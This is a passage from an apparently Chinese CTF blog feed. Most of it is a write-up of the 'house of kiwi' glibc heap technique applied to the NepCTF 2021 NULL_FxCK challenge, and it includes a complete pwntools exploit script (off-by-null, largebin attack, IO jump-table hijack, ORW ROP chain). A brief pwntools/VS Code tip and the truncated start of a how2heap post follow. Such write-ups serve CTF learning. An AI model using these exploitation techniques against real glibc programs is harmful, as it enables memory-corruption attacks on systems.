alt="image-20221026101620627"></p><p>在<code>_int_malloc</code>中存在一个 assert (chunk_main_arena (bck-&gt;bk));位置可以触发,此外当<code>top_chunk</code>的大小不够分配时,则会进入sysmalloc中</p><blockquote><p>GLIBC 2.32&#x2F;malloc.c:2394</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">......<br>assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>         prev_inuse (old_top) &amp;&amp;<br>         ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br>......<br></code></pre></td></tr></table></figure><p>此处会对top_chunk的<code>size|flags</code>进行assert判断</p><ul><li>old_size &gt;&#x3D; 0x20;</li><li>old_top.prev_inuse &#x3D; 0;</li><li>old_top页对齐</li></ul><p>通过这里也可以触发assert<br>下面手动实现进入assert后,可以想到fflush和fxprintf都和IO有关,可能需要涉及IO,一步步调试看看可以发现在<code>fflush</code>函数中调用到了一个指针:位于<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>指针,且观察发现RDX寄存器的值为<code>IO_helper_jumps</code>指针,多次调试发现RDX始终是一个固定的地址</p><p><img src="/img/article/house_of_kiwi/t01f675c08902cf9575.png" alt="img"></p><p>如果存在一个任意写,通过修改 <code>_IO_file_jumps + 0x60</code>的<code>_IO_file_sync</code>指针为<code>setcontext+61</code><br>修改<code>IO_helper_jumps + 0xA0 and 0xA8</code>分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移</p><h2 id="例题介绍"><a href="#例题介绍" class="headerlink" title="例题介绍"></a>例题介绍</h2><blockquote><p>以NepCTF 2021年中NULL_FxCK为例</p></blockquote><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><h4 id="沙箱开启"><a href="#沙箱开启" class="headerlink" title="沙箱开启"></a>沙箱开启</h4><p><img src="/img/article/house_of_kiwi/image-20221026134222730.png" alt="image-20221026134222730"></p><h4 id="保护全开"><a href="#保护全开" class="headerlink" title="保护全开"></a>保护全开</h4><p><img src="/img/article/house_of_kiwi/image-20221026134910200.png" alt="image-20221026134910200"></p><h4 id="禁用malloc-hook-free-hook"><a href="#禁用malloc-hook-free-hook" class="headerlink" title="禁用malloc_hook, free_hook"></a>禁用malloc_hook, free_hook</h4><p><img src="/img/article/house_of_kiwi/image-20221026135700420.png" alt="ban!!!"></p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><blockquote><p>整个程序只有在modify里有一次off by null 的机会，无其他漏洞</p></blockquote><h3 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h3><p>这里的思路其实有点公式化的味道，就和我们做数学题一样，都是通过题目给的条件来思考利用的手法。给了off_by_null就思考会用到堆块的合并导致的重叠。重叠带来的好处：</p><ul><li>通过切割堆块能使我们在合并的堆块内部任意地址写main_arena，这个任意地址可能是note数组的一个堆指针的fd，那么我们就可以泄露libc了</li><li>合并的时候的unlink能使得我们在已知堆块的fd和bk上写一个堆地址，这样就可以弥补一开始的截断带来的不能泄露堆块，然后成功泄露出堆块了</li></ul><h4 id="堆风水泄露libc和堆地址"><a href="#堆风水泄露libc和堆地址" class="headerlink" title="堆风水泄露libc和堆地址"></a>堆风水泄露libc和堆地址</h4><p>首先伪造一个chunk头，利用off by null unlink吞并几个Allocated状态的chunk. 然后add分割使得chunk进入unsortedbin，从而泄露libc. 同时包含，largebin中提前包含heap信息，从而泄露heap地址</p><h4 id="house-of-wiki"><a href="#house-of-wiki" class="headerlink" title="house of wiki"></a>house of wiki</h4><p>发现这题中的<code>exit</code>被换成了<code>_exit</code>，而<code>_exit</code>是不会存在<code>house of pig</code>里面的那条链子的，它直接就是一个<code>exit</code>的系统调用然后程序就结束了，所以任何打<code>exit</code>的链子都不能直接拿来用。遇到这种问题，有的师傅就开辟了一条名为<code>house of kiwi</code>的链子。主要是打<code>__malloc_assert</code>断言，有一个位于<code>_IO_file_jumps+0x60</code>的稳定的跳转指针<code>sync</code>和稳定的<code>rdx——_IO_helper_jumps</code>，而且这两个地方在gdb里都是有符号表的（比banana好找多了2333）：</p><p><img src="/img/article/house_of_kiwi/image-20221026150024215.png" alt="偏移确定"></p><p>那么我们通过两次任意地址写就行了？非也。因为还需要触发assert，看看malloc.c的源码，ctrl f输入”assert”。发现有80多个。这里介绍其中一种做法：当top_chunk的大小不够分配时,则会进入sysmalloc中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>         prev_inuse (old_top) &amp;&amp;<br>         ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>发现很多检测，我们注意到对topchunk的prev_inuse的检测，只要把topchunk的size位的prev_inuse置为0，申请一个比它大的堆块就可以触发了。我们发现，至少需要改三个地址，也就是执行三次任意地址写。从这道题的严苛条件，不能用tcache poison等简单手法。</p><h4 id="TLS段tcache-struct-attack"><a href="#TLS段tcache-struct-attack" class="headerlink" title="TLS段tcache struct attack"></a>TLS段tcache struct attack</h4><p>我们都知道，malloc_init会在heapbase段开设一个内存用于管理tcache。而这个管理tcache的地址，是可以从heapbase被我们劫持到另一个地方的，这是因为实际寻找的时候，是找到TLS段的管理tcache的地址，只不过malloc_init函数预设成了heapbase+0x10而已（注意，是heapbase+0x10而不是heapbase），我们可以在gdb中找到这段区域：</p><p><img src="/img/article/house_of_kiwi/image-20221026151700771.png" alt="image-20221026151700771"></p><p>通过<code>largebin attack</code>劫持这段为可控堆块，在上面布置任何我们想写的东西，<code>malloc</code>对应位置size大小就能够申请出来并且改写了（这里的偏移要调一调，不过也可以拿exp的模板直接来用，也就是）</p><p>通过改稳定的跳表sync为setcontext+61(因为setcontext会将[rdx+0xa0]设置为rsp，将[rdx+0xa8]设置为rip)，将稳定的rdx <code>_IO_helper_jumps</code>设置为<code>_IO_helper_jumps+0xa0</code>为存orw链，+0xa8为ret指令，并改top_chunk的size，然后申请一个比它的size大的堆块触发assert就可get_shell了</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>这道题考察了高版本的off_by_null，large bin attack，house of kiwi ， TLS attack</p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> sys <br><span class="hljs-keyword">import</span> os <br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span> <br><span class="hljs-comment"># context.update( os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;,timeout = 1)</span><br>binary = <span class="hljs-string">&#x27;./NULL_FXCK&#x27;</span><br>os.system(<span class="hljs-string">&#x27;chmod +x %s&#x27;</span>%binary)<br>elf = ELF(binary)<br>libc = elf.libc<br><span class="hljs-comment"># libc = ELF(&#x27;&#x27;)</span><br>context.binary = binary<br>DEBUG = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    p = process(binary)<br>    libc = elf.libc<br>    <span class="hljs-comment"># p = process([&#x27;qemu-arm&#x27;, binary])</span><br>    <span class="hljs-comment"># p = process([&#x27;qemu-arm&#x27;, binary,&#x27;-g&#x27;,&#x27;1234&#x27;])</span><br>    <span class="hljs-comment"># p = process([&#x27;qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,binary])</span><br><span class="hljs-keyword">else</span>:<br>    host = <span class="hljs-string">&#x27;&#x27;</span><br>    port = <span class="hljs-string">&#x27;&#x27;</span><br>    p = remote(host,port)<br><br>l64 = <span class="hljs-keyword">lambda</span>            : u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>l32 = <span class="hljs-keyword">lambda</span>            : u32(p.recvuntil(<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>sla = <span class="hljs-keyword">lambda</span> a,b        : p.sendlineafter(<span class="hljs-built_in">str</span>(a),<span class="hljs-built_in">str</span>(b))<br>sa  = <span class="hljs-keyword">lambda</span> a,b        : p.sendafter(<span class="hljs-built_in">str</span>(a),<span class="hljs-built_in">str</span>(b))<br>lg  = <span class="hljs-keyword">lambda</span> name,data  : p.success(name + <span class="hljs-string">&#x27;: 0x%x&#x27;</span> % data)<br>se  = <span class="hljs-keyword">lambda</span> payload    : p.send(payload)<br>rl  = <span class="hljs-keyword">lambda</span>            : p.recv()<br>sl  = <span class="hljs-keyword">lambda</span> payload    : p.sendline(payload)<br>ru  = <span class="hljs-keyword">lambda</span> a          : p.recvuntil(<span class="hljs-built_in">str</span>(a))<br>rint= <span class="hljs-keyword">lambda</span> x = <span class="hljs-number">12</span>     : <span class="hljs-built_in">int</span>( p.recv(x) , <span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params"> b = null</span>):<br>    <span class="hljs-keyword">if</span> (b == null):<br>        gdb.attach(p)<br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(p,<span class="hljs-string">&#x27;b %s&#x27;</span>%b)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">one_gadget</span>(<span class="hljs-params">filename</span>):<br>    log.progress(<span class="hljs-string">&#x27;Leak One_Gadgets...&#x27;</span>)<br>    one_ggs = <span class="hljs-built_in">str</span>(subprocess.check_output(<br>        [<span class="hljs-string">&#x27;one_gadget&#x27;</span>,<span class="hljs-string">&#x27;--raw&#x27;</span>, <span class="hljs-string">&#x27;-f&#x27;</span>,filename]<br>    )).split(<span class="hljs-string">&#x27; &#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,one_ggs))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">num</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,num)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , Content = <span class="hljs-string">&#x27;\x00&#x27;</span></span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span> , size)<br>    sa(<span class="hljs-string">&#x27;Content:&#x27;</span> , Content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , Content</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span> , idx)<br>    sla(<span class="hljs-string">&#x27;Content:&#x27;</span> , Content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx </span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span> , idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx </span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span> , idx)<br><br><br><span class="hljs-comment"># one_gad = one_gadget(libc.path)</span><br><span class="hljs-comment"># 本质是通过 unsorted bin 或者 large bin 的指针残留构造 unlink 的指针指向</span><br><br>add(<span class="hljs-number">0x418</span>)<br>add(<span class="hljs-number">0x108</span>)<br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#6</span><br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">5</span>)<br><br>delete(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># unsorted bin 合并 ，但合并不会清空数据，某处有残留的堆地址</span><br><br>add(<span class="hljs-number">0x438</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x418</span> +  p64( <span class="hljs-number">0x420</span> + <span class="hljs-number">0x210</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x420</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">1</span>)) <span class="hljs-comment">#0</span><br><br><span class="hljs-comment"># 0xa91 写到了原来 chunk3 的 size 处，刚好这下面有残留的堆地址</span><br><span class="hljs-comment"># 切割已经合并的大块</span><br><span class="hljs-comment"># unsorted bin 从新到旧排序</span><br><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#5</span><br><br><span class="hljs-comment"># 下面构造 fack fd </span><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x418</span> , <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">9</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#5</span><br><br><span class="hljs-comment"># 下面构造 fack bk</span><br><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br><br>add(<span class="hljs-number">0x9f8</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x428</span> , <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#7</span><br><br><span class="hljs-comment"># 下面进行 unlink</span><br>add(<span class="hljs-number">0x408</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x411</span>)) <span class="hljs-comment">#8</span><br>edit(<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x410</span> + p64(<span class="hljs-number">0x210</span> +<span class="hljs-number">0x430</span> + <span class="hljs-number">0x420</span> + <span class="hljs-number">0x420</span> + <span class="hljs-number">0x20</span> ))<br>delete(<span class="hljs-number">3</span>)<br><br>add(<span class="hljs-number">0x438</span> , flat(<span class="hljs-number">0</span> , <span class="hljs-number">0</span> ,<span class="hljs-number">0</span> , <span class="hljs-number">0x421</span>)) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x1600</span>) <span class="hljs-comment">#9</span><br><br>show(<span class="hljs-number">4</span>)<br>__malloc_hook = l64() - <span class="hljs-number">1644</span> - <span class="hljs-number">0x40</span> - <span class="hljs-number">4</span><br>libc.address = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>_environ = libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]<br>mp_ = libc.address + <span class="hljs-number">0x1e3280</span><br>_IO_list_all = libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>_IO_str_jumps = libc.address + <span class="hljs-number">0x1e5580</span><br>_IO_file_jumps = libc.address + <span class="hljs-number">0x1e54c0</span><br>_IO_helper_jumps = libc.address + <span class="hljs-number">0x1e48c0</span><br>setcontext = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br><br>show(<span class="hljs-number">5</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust( <span class="hljs-number">8</span> , <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x2b0</span><br><br>ptr_list = <span class="hljs-number">0x4160</span><br>lg(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span> , __malloc_hook)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br><span class="hljs-comment"># ptr_list = $rebase(0x000000000004160)</span><br><br>add(<span class="hljs-number">0x1458</span> , flat(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x208</span> , <span class="hljs-number">0x431</span> , <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x428</span> , <span class="hljs-number">0x421</span> , <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x418</span> , <span class="hljs-number">0xa01</span>) )<br><br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">5</span>)<br><br>add(<span class="hljs-number">0x1458</span>  )<br>add(<span class="hljs-number">0x448</span>)<br><br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0x1458</span> , flat(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x208</span> , <span class="hljs-number">0x431</span> , __malloc_hook + <span class="hljs-number">0x460</span>,__malloc_hook + <span class="hljs-number">0x460</span> , <span class="hljs-number">0</span> , _IO_list_all - <span class="hljs-number">0x20</span> ) )<br><br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x448</span>)<br>add(<span class="hljs-number">0x418</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x438</span> , <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x2c0</span> + p64(_IO_file_jumps + <span class="hljs-number">96</span>) + <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x98</span> + flat(_IO_helper_jumps + <span class="hljs-number">0xa0</span> , heap_base + <span class="hljs-number">0x4bb0</span> ) ) <span class="hljs-comment">#设置 entry</span><br><br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0x1458</span> , flat(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x208</span> , <span class="hljs-number">0x431</span> , __malloc_hook + <span class="hljs-number">0x460</span>,__malloc_hook + <span class="hljs-number">0x460</span> , <span class="hljs-number">0</span> , mp_ + <span class="hljs-number">80</span> - <span class="hljs-number">0x20</span> ) )<br>delete(<span class="hljs-number">11</span>)<br><br><br>read_addr = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>open_addr = libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>puts_addr = libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leave_ret = libc.search(asm(<span class="hljs-string">&#x27;leave;ret&#x27;</span>)).<span class="hljs-built_in">next</span>()<br>pop_rax_ret = libc.search(asm(<span class="hljs-string">&#x27;pop rax; ret&#x27;</span>)).<span class="hljs-built_in">next</span>()<br>pop_rdi_ret = libc.search(asm(<span class="hljs-string">&#x27;pop rdi; ret&#x27;</span>)).<span class="hljs-built_in">next</span>()<br>pop_rsi_ret = libc.search(asm(<span class="hljs-string">&#x27;pop rsi; ret&#x27;</span>)).<span class="hljs-built_in">next</span>()<br>pop_rdx_pop_rbx_ret = libc.search(asm(<span class="hljs-string">&#x27;pop rdx ; pop rbx ; ret&#x27;</span>)).<span class="hljs-built_in">next</span>()<br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><br>flag_addr = heap_base + <span class="hljs-number">0x4770</span> + <span class="hljs-number">0x100</span><br>chain = flat(<br>    pop_rdi_ret , flag_addr , pop_rsi_ret , <span class="hljs-number">0</span> , open_addr,<br>    pop_rdi_ret , <span class="hljs-number">3</span> , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , <span class="hljs-number">0x100</span> , <span class="hljs-number">0</span> , read_addr,<br>    pop_rdi_ret , flag_addr , puts_addr<br>).ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>) + <span class="hljs-string">&#x27;flag\x00&#x27;</span><br><span class="hljs-comment"># len chain 0x80</span><br><br><span class="hljs-comment"># dbg()</span><br>add(<span class="hljs-number">0x448</span> , chain) <span class="hljs-comment"># copy</span><br>add(<span class="hljs-number">0x418</span>)<br><br><span class="hljs-comment"># House of kiwi 三大条件</span><br><br><br>add(<span class="hljs-number">0x1450</span> , p64(setcontext)[:-<span class="hljs-number">1</span>])<br><br>add(<span class="hljs-number">0x1590</span> , flat( heap_base + <span class="hljs-number">0x4770</span> , ret ))<br>add(<span class="hljs-number">0x15a0</span> , flat( <span class="hljs-number">0</span> , <span class="hljs-number">0x3e0</span>))<br><span class="hljs-comment"># 0x1450 0x1590 0x15a0</span><br><span class="hljs-comment"># dbg()</span><br><br><span class="hljs-comment"># dbg()</span><br>cmd(<span class="hljs-number">1</span>)<br>sla(<span class="hljs-string">&#x27;Size&#x27;</span> , <span class="hljs-number">0x1000</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>vscode使用pwntools代码高亮出错</title>
    <link href="/2022/10/25/vscode%E4%BD%BF%E7%94%A8pwntools%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E5%87%BA%E9%94%99/"/>
    <url>/2022/10/25/vscode%E4%BD%BF%E7%94%A8pwntools%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E5%87%BA%E9%94%99/</url>
    
    <content type="html"><![CDATA[<blockquote><p>vscode在使用pwntools的send系列函数时，会出现高亮错误的情况，目前最好的解决办法时对pwntools源码进行更改</p></blockquote><p>右键send函数，选择<code>Go to Definition</code>，打开pwntools源码</p><p><img src="/img/article/vscode-pwntools/image-20221025192410368.png" alt="image-20221025192410368"></p><p><code>ctrl+F</code>搜索send_raw函数</p><p><img src="/img/article/vscode-pwntools/image-20221025192616883.png" alt="image-20221025192616883"></p><p>把函数末尾的<code>raise EOFError(&#39;Not implemented&#39;)</code>更换成<code>raise NotImplementedError()</code>既可</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【how2heap】 botcake,einherjar,lore</title>
    <link href="/2022/10/20/how2heap%E2%91%A0%20botcake,einherjar,lore/"/>
    <url>/2022/10/20/how2heap%E2%91%A0%20botcake,einherjar,lore/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本系列将针对glibc2.31及glibc2.35两个版本进行讨论，其他版本可以根据特性进行类推，建议先对各种堆块的基本特性和数据结构做已了解之后进行学习。</p></blockquote><h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h2><p>house_of_botcake利用的是块的分割，使得只存在uaf漏洞的前提下实现堆块的溢出,达到获取任意地址的目的，下面我们用how2heap中的例子进行理解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 